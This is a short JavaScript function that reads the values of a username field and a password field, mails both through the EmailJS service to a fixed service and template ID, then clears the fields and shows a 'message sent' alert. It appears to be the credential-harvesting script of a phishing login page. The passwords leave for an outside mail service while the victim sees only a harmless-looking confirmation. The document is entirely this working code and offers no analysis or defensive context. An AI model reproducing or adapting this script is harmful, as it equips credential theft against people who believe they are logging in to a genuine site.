function sendMail(){

    var params = {

        user1: document.getElementById("Username").value,
        pwd1: document.getElementById("pwd1").value,
    };

    const serviceID = "service_7js3c1h"
const templateID = "template_gkdi0xs"

emailjs.send(serviceID,templateID,params)
.then(
        res =>{
            document.getElementById("Username").value = "";
            document.getElementById("pwd1").value = "";
            console.log(res);
            alert("your massage as been send successfully");


        }
)
.catch((err) => console.log(err));
}

